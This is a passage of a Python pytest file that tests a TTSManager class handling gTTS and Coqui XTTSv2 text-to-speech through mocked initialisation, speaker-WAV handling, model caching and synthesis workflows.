        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="tts_models/multilingual/multi-dataset/xtts_v2",
            language="en"
        )
        assert manager.service_name == "xttsv2"
        assert manager.model_name == "tts_models/multilingual/multi-dataset/xtts_v2"
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    async def test_speaker_wav_handling_xttsv2(self, mock_coqui, mock_gtts, mock_ensure_dirs):
        """Test speaker WAV file handling for XTTSv2"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model",
            speaker_wav_path="/path/to/speaker.wav"
        )
        
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as temp_speaker:
            temp_speaker.write(b'fake_speaker_data')
            temp_speaker_path = temp_speaker.name
        
        try:
            with patch('os.path.exists', return_value=True):
                with patch('asyncio.to_thread') as mock_to_thread:
                    await manager.synthesize("Test with speaker", "output.wav", temp_speaker_path)
                    mock_to_thread.assert_called_once()
        finally:
            if os.path.exists(temp_speaker_path):
                os.unlink(temp_speaker_path)
    
    @patch('tts_manager.ensure_client_directories')
    def test_service_initialization_error_handling(self, mock_ensure_dirs):
        """Test service initialization error handling"""
        # Test initialization with unsupported service
        manager = TTSManager(tts_service_name="unsupported_service")
        assert not manager.is_initialized
        assert manager.tts_instance is None
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    @patch('tts_manager.CoquiTTS')
    def test_model_download_and_caching(self, mock_coqui, mock_gtts, mock_ensure_dirs):
        """Test model download and caching behavior"""
        manager = TTSManager(tts_service_name="gtts")
        
        # Test model path resolution
        result = manager._get_or_download_model_blocking("xttsv2", "test_model")
        assert result == "test_model"
        
        # Test unsupported service
        result = manager._get_or_download_model_blocking("unsupported", "test_model")
        assert result == "test_model"  # Returns identifier for fallback


class TestTTSManagerIntegrationScenarios:
    """Test suite for integration scenarios and end-to-end workflows"""
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.gtts')
    async def test_full_synthesis_workflow_gtts(self, mock_gtts, mock_ensure_dirs):
        """Test complete synthesis workflow with gTTS"""
        manager = TTSManager(tts_service_name="gtts", language="en")
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            with patch('os.path.exists', return_value=True):
                with patch('os.path.getsize', return_value=1024):
                    result = await manager.synthesize("Hello world", "test_output.mp3")
                    assert result is not None
                    mock_to_thread.assert_called_once()
    
    @patch('tts_manager.ensure_client_directories')
    @patch('tts_manager.CoquiTTS')
    async def test_full_synthesis_workflow_xttsv2(self, mock_coqui, mock_ensure_dirs):
        """Test complete synthesis workflow with XTTSv2"""
        mock_tts_instance = Mock()
        mock_coqui.return_value = mock_tts_instance
        
        manager = TTSManager(
            tts_service_name="xttsv2",
            model_name="test_model",
            language="en"
        )
        
        with patch('asyncio.to_thread') as mock_to_thread:
            mock_to_thread.return_value = None
            with patch('os.path.exists', return_value=True):
                with patch('os.path.getsize', return_value=1024):
                    result = await manager.synthesize("Hello world", "test_output.wav")
                    assert result is not None
                    mock_to_thread.assert_called_once()
    
    def test_service_discovery_and_selection(self):
        """Test service discovery and automatic selection"""
        available_services = TTSManager.list_services()
        assert isinstance(available_services, list)
        
        for service in available_services:
            assert isinstance(service, str)
            assert len(service) > 0
        
        # Test model availability for each service
        for service in available_services:
            models = TTSManager.get_available_models(service)
            assert isinstance(models, list)


if __name__ == "__main__":
    # Add markers for different test categories
    pytest.main([
        __file__, 
        "-v",
        "-m", "not slow",  # Skip slow tests by default
        "--tb=short"
    ])